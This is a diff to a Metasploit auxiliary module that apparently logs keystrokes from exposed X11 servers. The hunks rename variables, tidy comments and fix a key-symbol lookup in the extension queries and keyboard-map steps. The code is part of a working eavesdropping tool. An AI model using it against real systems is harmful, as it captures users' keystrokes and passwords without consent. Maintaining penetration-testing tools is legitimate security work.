@@ -87,7 +87,7 @@ class MetasploitModule < Msf::Auxiliary
       if syms.n_syms == 0
         key_map[key_code] = nil
       else
-        sym = map_data.key_map_array[keysym_index].key_sym_array[0].syms
+        sym = map_data.key_map_array[keysym_index].key_sym_array[0]
         begin
           character = sym.chr
           character = '[space]' if character == ' '
@@ -129,7 +129,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    query_extension_calls = 0
+    query_extension_call_counter = 0
     @keylogger_log = ''
     @keylogger_print_buffer = ''
 
@@ -147,7 +147,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     vprint_status('[2/9] Checking on BIG-REQUESTS extension')
-    big_requests_plugin = query_extension('BIG-REQUESTS', query_extension_calls)
+    big_requests_plugin = query_extension('BIG-REQUESTS', query_extension_call_counter)
     fail_with(Msf::Module::Failure::UnexpectedReply, 'Unable to process response') if big_requests_plugin.nil?
     if big_requests_plugin.present == 1
       print_good("  Extension BIG-REQUESTS is present with id #{big_requests_plugin.major_opcode}")
@@ -173,7 +173,7 @@ class MetasploitModule < Msf::Auxiliary
     sock.put(gc_header.to_binary_s +
              gc_body.to_binary_s +
              gp_header.to_binary_s +
-             gp_body.to_binary_s) # not sure why we do this
+             gp_body.to_binary_s) # not sure why we also do a get property, but it emulates how the library works
 
     # nothing valuable in the response, just make sure we read it in to
     # confirm its expected data and not leave the response on the socket
@@ -188,7 +188,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     vprint_status('[5/9] Checking on XKEYBOARD extension')
-    xkeyboard_plugin = query_extension('XKEYBOARD', query_extension_calls)
+    xkeyboard_plugin = query_extension('XKEYBOARD', query_extension_call_counter)
     fail_with(Msf::Module::Failure::UnexpectedReply, 'Unable to process response') if xkeyboard_plugin.nil?
     if xkeyboard_plugin.present == 1
       print_good("  Extension XKEYBOARD is present with id #{xkeyboard_plugin.major_opcode}")
@@ -205,24 +205,25 @@ class MetasploitModule < Msf::Auxiliary
                                   full_key_types: 1,
                                   full_key_syms: 1,
                                   full_modifier_map: 1).to_binary_s)
-    data = sock.get_once(-1, 1)
+    map_raw_data = sock.get_once(-1, 1)
+    # for debugging packet output, uncomment following line
     # puts data.bytes.map { |b| "\\x" + b.to_s(16).rjust(2, '0') }.join
-    map_data = X11GetMapReply.read(data)
+    map_data = X11GetMapReply.read(map_raw_data)
 
     vprint_status('[8/9] Enabling notification on keyboard and map')
     sock.put(X11SelectEvents.new(xkeyboard_id: xkeyboard_plugin.major_opcode,
                                  affect_which_new_keyboard_notify: 1,
                                  affect_new_keyboard_key_codes: 1,
                                  affect_new_keyboard_device_id: 1).to_binary_s +
-                              X11SelectEvents.new(xkeyboard_id: xkeyboard_plugin.major_opcode,
-                                                  affect_which_map_notify: 1,
-                                                  affect_map_key_types: 1,
-                                                  affect_map_key_syms: 1,
-                                                  affect_map_modifier_map: 1,
-                                                  map_key_types: 1,
-                                                  map_key_syms: 1,
-                                                  map_modifier_map: 1).to_binary_s) # not sure what this does
-    sock.get_once(-1, 1)
+             X11SelectEvents.new(xkeyboard_id: xkeyboard_plugin.major_opcode,
+                                 affect_which_map_notify: 1,
+                                 affect_map_key_types: 1,
+                                 affect_map_key_syms: 1,
+                                 affect_map_modifier_map: 1,
+                                 map_key_types: 1,
+                                 map_key_syms: 1,
+                                 map_modifier_map: 1).to_binary_s) # not sure what this does, but emulates x11 c library
+    # this request doesn't receive any response data
 
     vprint_status('[9/9] Creating local keyboard map')
     key_map = build_sym_key_map(map_data)
